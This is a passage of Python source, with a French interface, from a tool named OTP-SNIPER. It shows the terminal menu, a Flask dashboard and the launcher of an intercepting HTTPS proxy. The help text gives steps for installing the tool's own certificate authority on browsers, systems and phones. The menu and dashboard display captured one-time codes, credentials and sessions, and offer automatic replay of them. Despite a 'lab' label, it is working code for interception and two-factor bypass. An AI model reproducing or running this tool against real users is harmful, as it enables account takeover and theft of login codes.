            ca_cert = Path(self.config['ca_dir']) / 'ca.crt'
            CONSOLE.print(f"[green]Certificat :[/green] {ca_cert.absolute()}\n")
            CONSOLE.print("[yellow]Installation Firefox :[/yellow]")
            CONSOLE.print("  Préférences → Vie privée → Certificats → Voir les certificats")
            CONSOLE.print("  → Autorités → Importer → ca.crt")
            CONSOLE.print("  → Cocher 'Confier cette autorité'\n")
            CONSOLE.print("[yellow]Installation système (Debian/Ubuntu) :[/yellow]")
            CONSOLE.print(f"  sudo cp {ca_cert} /usr/local/share/ca-certificates/otp-sniper.crt")
            CONSOLE.print("  sudo update-ca-certificates\n")
            CONSOLE.print("[yellow]Mobile :[/yellow]")
            CONSOLE.print("  Copier ca.crt sur le téléphone → Paramètres → Installer certificat CA")
        else:
            CONSOLE.print("[red]cryptography non installé[/red]")
            CONSOLE.print("  pip install cryptography")
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def help_lab(self):
        self.clear(); self.banner()
        CONSOLE.print("""
[bold cyan]🧪 CONFIGURATION DU CLIENT[/bold cyan]

[bold yellow]Firefox :[/bold yellow]
  Settings → Network → Manual proxy → 127.0.0.1:8080

[bold yellow]Chrome :[/bold yellow]
  chrome --proxy-server="http://127.0.0.1:8080"

[bold yellow]curl :[/bold yellow]
  curl -x http://127.0.0.1:8080 -k https://lab.local

[bold yellow]Python :[/bold yellow]
  requests.get(url, proxies={'http':'http://127.0.0.1:8080',
                              'https':'http://127.0.0.1:8080'}, verify=False)

[bold yellow]Mobile Android :[/bold yellow]
  Wi-Fi → Modifier → Proxy manuel : [IP machine]:8080

[bold yellow]HTTPS :[/bold yellow]
  Installer le CA (option 12) dans le navigateur/système
""")
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def start_proxy(self):
        if self.proxy_running:
            CONSOLE.print("[yellow]Déjà actif.[/yellow]"); time.sleep(1); return
        try:
            cm = CertificateManager(self.config['ca_dir']) if CRYPTO_OK else None
            self.proxy = ProxyServer(self.config['proxy_port'], self.db, self.detector,
                                     cert_manager=cm, log_callback=self.log)
            self.proxy.start()
            time.sleep(0.5)
            self.proxy_running = True
            CONSOLE.print(f"[green]✅ Proxy port {self.config['proxy_port']}[/green]")
            if CRYPTO_OK and cm:
                CONSOLE.print(f"[green]✅ HTTPS actif — CA: {cm.ca_cert_path}[/green]")
            else:
                CONSOLE.print("[yellow]HTTPS non supporté[/yellow]")
        except Exception as e:
            CONSOLE.print(f"[red]{e}[/red]")
        time.sleep(2)

    def stop_proxy(self):
        if not self.proxy_running:
            CONSOLE.print("[yellow]Déjà arrêté.[/yellow]"); time.sleep(1); return
        if self.proxy: self.proxy.stop()
        self.proxy_running = False
        CONSOLE.print("[red]Proxy arrêté.[/red]"); time.sleep(1.5)

    def launch_web(self):
        CONSOLE.print(f"\n[cyan]Web http://127.0.0.1:{self.config['web_port']}[/cyan]")
        threading.Thread(target=start_web_ui, args=(self.db, self.config, self.detector),
                         daemon=True).start()
        time.sleep(1)
        Prompt.ask("\n[cyan]Entrée[/cyan]", default="")

    def run(self):
        while True:
            self.show_menu()
            c = Prompt.ask("[bold cyan]Choix[/bold cyan]", default="0")
            if c == '1': self.start_proxy()
            elif c == '2': self.stop_proxy()
            elif c == '3': self.show_otps()
            elif c == '4': self.show_sessions()
            elif c == '5': self.show_credentials()
            elif c == '6': self.replay_menu()
            elif c == '7': self.auto_replay_menu()
            elif c == '8': self.show_stats()
            elif c == '9': self.show_logs()
            elif c == '10': self.export_data()
            elif c == '11': self.launch_web()
            elif c == '12': self.show_ca_path()
            elif c == '13': self.help_lab()
            elif c == '0':
                if self.proxy_running: self.proxy.stop()
                CONSOLE.print("\n[bold green]Au revoir ![/bold green]\n")
                sys.exit(0)


# ==================== WEB ====================

def start_web_ui(db, config, detector):
    if not FLASK_OK:
        print("[!] Flask non installé"); return
    app = Flask(__name__)

    @app.route('/')
    def index():
        s = db.stats()
        otps = db.get_otps(50)
        html = '''<!DOCTYPE html><html><head><meta charset="utf-8">
        <title>OTP-SNIPER</title>
        <style>
        body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
        h1 { color: #58a6ff; } h2 { color: #7ee787; }
        .stats { display: flex; gap: 20px; margin: 20px 0; }
        .stat { background: #161b22; padding: 15px 25px; border-radius: 8px; border: 1px solid #30363d; }
        .stat b { font-size: 28px; color: #7ee787; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #30363d; }
        th { color: #7ee787; } tr:hover { background: #161b22; }
        </style></head><body>
        <h1>🔫 OTP-SNIPER v1.1</h1>
        <div class="stats">
        <div class="stat">Requêtes<br><b>''' + str(s['requests']) + '''</b></div>
        <div class="stat">OTP<br><b style="color:#f85149">''' + str(s['otp']) + '''</b></div>
        <div class="stat">Credentials<br><b style="color:#f85149">''' + str(s['credentials']) + '''</b></div>
        <div class="stat">Sessions<br><b style="color:#f85149">''' + str(s['sessions']) + '''</b></div>
        </div><h2>Codes OTP</h2>
        <table><tr><th>ID</th><th>Code</th><th>Méthode</th><th>User</th><th>URL</th><th>Time</th></tr>'''
        for o in otps:
            html += f'<tr><td>{o[0]}</td><td style="color:#f85149"><b>{o[1]}</b></td><td>{o[2]}</td><td>{o[4] or "-"}</td><td>{o[5][:60]}</td><td>{o[6][11:19]}</td></tr>'
        html += '</table><p style="color:#6e7681;font-size:12px">Auto-refresh 3s</p><script>setTimeout(()=>location.reload(),3000);</script></body></html>'
        return html

    @app.route('/api/stats')
    def api_stats(): return jsonify(db.stats())

    @app.route('/api/otps')
    def api_otps(): return jsonify(db.get_otps(100))

    app.run(host='0.0.0.0', port=config['web_port'], debug=False, use_reloader=False)


# ==================== MAIN ====================

def choose_interface():
    if not RICH_OK: return 'tui'
    CONSOLE.clear()
    CONSOLE.print(Panel.fit(
        "[bold cyan]🔫 OTP-SNIPER v1.1[/bold cyan]\n\n"
        "[yellow]Choisissez votre interface :[/yellow]\n\n"
        "  [1] 🖥️  TUI (Terminal riche)\n"
        "  [2] 🌐 Web (Navigateur)\n"
        "  [3] 🔄 Les deux\n"
        "  [0] ❌ Quitter\n",
        title="[bold cyan]Interface[/bold cyan]", border_style="cyan"))
    c = Prompt.ask("\n[bold cyan]Choix[/bold cyan]", default="1")
    if c == '0': sys.exit(0)
    if c == '2': return 'web'
    if c == '3': return 'both'
    return 'tui'


def main():
    parser = argparse.ArgumentParser(description='OTP-SNIPER v1.1')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--web-port', type=int, default=5000)
    parser.add_argument('--db', default='otp_sniper.db')
    parser.add_argument('--mode', choices=['tui', 'web', 'both', 'ask'], default='ask')
    args = parser.parse_args()

    config = dict(DEFAULT_CONFIG)
    config['proxy_port'] = args.port
    config['web_port'] = args.web_port
    config['db_path'] = args.db

    db = Database(config['db_path'])
    detector = Detector(db)
    replay_engine = ReplayEngine(db, config)

    mode = choose_interface() if args.mode == 'ask' else args.mode

    if mode == 'web':
        cm = CertificateManager(config['ca_dir']) if CRYPTO_OK else None
        proxy = ProxyServer(config['proxy_port'], db, detector, cm)
        proxy.start()
        CONSOLE.print(f"\n[green]✅ Proxy port {config['proxy_port']}[/green]")
        CONSOLE.print(f"[green]✅ Web http://127.0.0.1:{config['web_port']}[/green]\n")
        start_web_ui(db, config, detector)
    elif mode == 'both':
        tui = TUIMenu(db, config, detector, replay_engine)
        cm = CertificateManager(config['ca_dir']) if CRYPTO_OK else None
        proxy = ProxyServer(config['proxy_port'], db, detector, cm, log_callback=tui.log)
        proxy.start()
        tui.proxy = proxy
        tui.proxy_running = True
        threading.Thread(target=start_web_ui, args=(db, config, detector), daemon=True).start()
        time.sleep(1)
        tui.log(f"[PROXY] Port {config['proxy_port']}")
        tui.run()
    else:
        tui = TUIMenu(db, config, detector, replay_engine)
        tui.run()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrompu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erreur: {e}")
        import traceback; traceback.print_exc()
        sys.exit(1)